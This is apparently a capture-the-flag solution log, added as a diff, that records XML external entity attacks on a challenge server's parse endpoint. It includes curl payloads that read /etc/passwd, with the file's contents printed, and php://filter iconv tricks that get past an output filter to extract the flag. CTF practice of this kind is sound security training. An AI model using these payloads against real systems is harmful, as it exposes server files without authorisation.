@@ -1,0 +1,63 @@
+http://35.198.183.125:30526/parse?%3Cfoo%3Ehi%21%3C%2Ffoo%3E=&_token=0mluRXZCtP48MkON9ZxtGmJOyrK5i7iHeJKt93Tn
+	"Empty string supplied as input."
+curl -X GET 'http://35.198.183.125:30526/parse' --data "test=test"
+	That XML string is not well-formed
+
+# Try XXE
+curl -X GET 'http://35.198.183.125:30526/parse' --data '<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY exfiltrate SYSTEM "/etc/passwd">
+]>
+<foo>&exfiltrate;</foo>'
+	root:x:0:0:root:/root:/bin/bash
+	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+	bin:x:2:2:bin:/bin:/usr/sbin/nologin
+	sys:x:3:3:sys:/dev:/usr/sbin/nologin
+	sync:x:4:65534:sync:/bin:/bin/sync
+	games:x:5:60:games:/usr/games:/usr/sbin/nologin
+	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+	_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+	www:x:1000:3000::/var/www:/usr/sbin/nologin
+
+XXE Success
+
+# Fail Method (Direct access, base64)
+curl -X GET 'http://35.198.183.125:30526/parse' --data '<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY exfiltrate SYSTEM "/var/www/html/flag">
+]>
+<foo>&exfiltrate;</foo>'
+	Is this the flag? Maybe... You shall not pass.
+
+
+<!ENTITY exfiltrate SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag">
+	You just tried to exfiltrate using base64? Nice. Try again!
+
+
+# Success Method (UCS-4LE.UCS-4BE, utf-16le.utf-8)
+<!ENTITY exfiltrate SYSTEM "php://filter/convert.iconv.UCS-4LE.UCS-4BE/resource=/var/www/html/flag">
+	{ftcdb202684203726366a8ec169033d2183c370af05b957b024a7e12a11ba3c0310
+
+
+<!ENTITY exfiltrate SYSTEM "php://filter/convert.iconv.utf-16le.utf-8/resource=/var/www/html/flag">
+	Store in out.txt
+
+# Convert
+php convert.php
+	# UCS-4LE.UCS-4BE Result
+	ctf{02bd486273026362e8a6961cd3303812073c50fa759b420b1e7a11a2c3ab0130
+	# utf-16le.utf-8 Result
+	ctf{02bd486273026362e8a6961cd3303812073c50fa759b420b1e7a11a2c3ab0130}
